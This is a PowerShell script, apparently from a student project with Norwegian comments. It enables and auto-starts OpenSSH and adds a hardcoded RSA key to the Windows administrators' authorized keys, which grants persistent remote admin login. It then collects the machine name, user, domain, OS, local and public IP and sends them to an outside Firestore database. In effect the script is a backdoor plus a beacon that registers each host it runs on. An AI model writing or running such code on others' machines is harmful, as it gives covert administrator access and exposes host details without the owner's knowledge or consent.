Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType Automatic

cd C:\ProgramData\ssh
New-Item -ItemType File -Path ".\administrators_authorized_keys"
icacls.exe "C:/ProgramData/ssh/administrators_authorized_keys" /inheritance:r /grant "Administrators:F" /grant "SYSTEM:F"
Add-Content -Path ".\administrators_authorized_keys" -Value "
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwAFU06iFUe3eKSgT+l1P7gS0i86mkPYXt4H/1l8qfkQWSek1pW15v7SRM9Chdpdu4CG5ygTkOzywr+skVdW3UuSeLdCWenGt9r8AF3mPI+J2AucZeJW0o5qUKEmLk3+X7n69G1rZzbPhxkzNjdP8eptQ8RBDH7S0Ef5cPjCu0Ci9sEGuDXi0aINuo7Kah6QvKUQqF0ZS5DkZ3WJhMvcg/z2l84hPfg3DaulZ4yA+c8EvyxGOnLcgYC51DRRo2KZSQuAfsSYL83VlGDIxIegjFlgSrWj+PVo6e16135jT2nbOVvlN/Jhz8bPA8PpmHdamjoNr1qUtJnHIUYMBezNxDYmwlDJuTOoG0lyZCZPF+9GXIyHqSDA4192Cq5u4kWP1CiJ77/0UbfNJmXi5+n3E/CBjQuiIPwh8fpS03xPpYpafLPEWO1tUfjIdruApdiS9ljayDLg76Cv8ZBCoScIxnr3d0ava0BJF4wIFyhcRZYBjwtKvSShcMVw7hFQxJj48=
"

$authorizedKeys = Get-Content -Path ".\administrators_authorized_keys"

Restart-Service sshd

# Definer URL-en for Firestore-database
$projectID = "bachelor-7e242"  # Ditt prosjekt-ID
$collectionName = "machines"  # Målet kolleksjon

# Hent navnet på PC-en
$pcName = [System.Environment]::MachineName

# Hent brukernavn
$userName = [System.Environment]::UserName

# Hent domenenavnet for nåværende bruker
$userDomainName = [System.Environment]::UserDomainName

# Hent informasjon om operativsystemet
$osVersion = [System.Environment]::OSVersion

# Hent kommandolinjeargumenter
$commandLineArgs = [System.Environment]::GetCommandLineArgs()

# Hent banen til nåværende arbeidsmappe
$currentDirectory = [System.Environment]::CurrentDirectory

# Hent banen til systemkatalogen
$systemDirectory = [System.Environment]::SystemDirectory

# Antall prosessorer på datamaskinen
$processorCount = [System.Environment]::ProcessorCount

# Escaper mellomrom i PC-navnet
$escapedPcName = $pcName.Replace(" ", "%20")

# SSH-variabler
$ethIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet").IPAddress
# $wifiIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi").IPAddress
$publicIP = (Invoke-WebRequest ifconfig.me/ip).Content
$user = whoami

# Definer URL-en for dokumentet
$documentUrl = "https://firestore.googleapis.com/v1/projects/$projectID/databases/(default)/documents/$collectionName/$escapedPcName"

# Forsøk å opprette et dokument med et dummy felt
$newDocBody = @{
    fields = @{
        dummyField = @{ stringValue = "init" }
    }
} | ConvertTo-Json -Depth 2

# Forsøk å opprette eller oppdatere dokumentet
try {
    Invoke-RestMethod -Uri $documentUrl -Method Patch -Body $newDocBody -ContentType 'application/json'
    Write-Output "Document created or updated with dummy field"
} catch {
    Write-Error "Error creating or updating document: $_"
}

# Vent og forsikre at dokumentet er opprettet eller oppdatert
Start-Sleep -Seconds 5

# Definer URL-en for den nye sub-kolleksjonen, med dagens dato og tid som navn
$dateTimeCollectionName = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
$newCollectionUrl = "$documentUrl/$dateTimeCollectionName"

# Opprett en enkel JSON-kropp for POST-forespørselen
$body = @{
    fields = @{
        name = @{
            stringValue = $pcName
        }
        status = @{ stringValue = "Operational" }
        userName = @{ stringValue = $userName }
        userDomainName = @{ stringValue = $userDomainName }
        osVersion = @{ stringValue = $osVersion.ToString() }
        commandLine = @{ stringValue = $commandLineArgs -join " " }
        currentDirectory = @{ stringValue = $currentDirectory }
        systemDirectory = @{ stringValue = $systemDirectory }
        processorCount = @{ integerValue = $processorCount }
        ethIP = @{ stringValue = $ethIP }
        # Scriptet blir "stuck" på denne linjen, og kjører ikke videre
        # authorizedKeys = @{ stringValue = $authorizedKeys }
        wifiIP = @{ stringValue = $wifiIP }
        publicIP = @{ stringValue = $publicIP }
        user = @{ stringValue = $user }
    }
} | ConvertTo-Json -Depth 10

# Definer HTTP-headere
$headers = @{
    "Content-Type" = "application/json"
}

# Send POST-forespørselen for å opprette den nye sub-kolleksjonen og lagre informasjonen
try {
    $response = Invoke-RestMethod -Uri $newCollectionUrl -Method Post -Body $body -Headers $headers
    Write-Output "Response from Firestore: $response"
} catch {
    Write-Error "Error sending data to Firestore: $_"
}

# Fjern dummy feltet
$removeDummyField = @{
    fields = @{
        dummyField = @{ nullValue = $null } # Endre null til $null
    }
} | ConvertTo-Json -Depth 2

try {
    Invoke-RestMethod -Uri $documentUrl -Method Patch -Body $removeDummyField -ContentType 'application/json'
    Write-Output "Dummy field removed from the document"
} catch {
    Write-Error "Error removing dummy field from the document: $_"
}
